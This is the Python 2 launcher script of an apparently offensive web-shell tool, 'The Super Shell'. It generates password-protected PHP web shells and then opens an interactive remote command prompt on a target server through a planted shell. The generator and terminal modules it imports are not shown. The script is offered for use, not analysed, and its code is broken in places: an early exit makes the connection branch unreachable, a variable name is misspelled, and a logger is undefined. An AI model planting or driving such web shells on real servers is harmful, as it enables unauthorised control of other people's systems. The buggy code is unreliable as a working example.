#!/usr/bin/python
# import requests
#
# Author(s): Matias Menares (Gh0st)
# The Super Shell
#
from core.terminal import Terminal
from core.server import Server
from core.generate import Generator
import os
import urllib  
import json
import argparse
import sys
import sqlite3 as lite

#try:
#    con = lite.connect('db/database.db')
#    cur = con.cursor()                  
    #cur.execute("INSERT INTO Shell VALUES(1,'xxx','xxx','xxx')")
#except lite.Error, e:
#    print "Error %s:" % e.args[0]
#    sys.exit(1)
# Create table
parser = argparse.ArgumentParser()
parser.add_argument("-u", help="Url")
parser.add_argument("-g", help="Generate Shell")
parser.add_argument("-p", help="Password")
args = parser.parse_args()
#BANNER 
print "\n"   
for line in open("extras/banner.txt"):
	print line,
print "\n"   
print "     [*]------------------- WebShell Ver. 0.1 @matiasmenares -------------------[*]\n"
print "     	  [*]------------------- Fork me on github -------------------[*]\n"
print "\n"
params = parser.parse_args()

def main(params):
	if params.u and params.p:
		url = params.u
		password = params.p
	if params.g and params.p:
		name = params.g
		password = params.p
		shell = Generator(name,password)
		isphp = name.partition('.')
		if isphp[2] == "php":
			print 'Creating Shell file...'
			creating = shell.php()
		if creating:
			print('robot@shuffle[~]$> Shell was created! in out/'+name)
		else:
			print("robot@shuffle[~]$> Something went wrong")
	sys.exit(1)	
	if params.u and params.p:			
		Server = Server(params.u,params.p)
		con = Server.conect()
		if con['response'] == '200':
			print "#> Conecction Established, Enjoy!\n"
			terminal = Terminal(url,paramss.p)
			server_info = Server.server_info()
			while True:
				send = raw_input(server_info['server_name']+"@"+server_info['user']+"["+server_info['pwd']+"]"+server_info['user_bash']+">")
				termina = terminal.terminal(send)
				print termina['command']
		elif con['response'] == '302':
			print "robot@shuffle[~]$> Response: "+con['error']
		else:
			print "robot@shuffle[~]$> Connection fail."
try:
    main(params)
except (KeyboardInterrupt, EOFError):
    log.info('Exiting.')
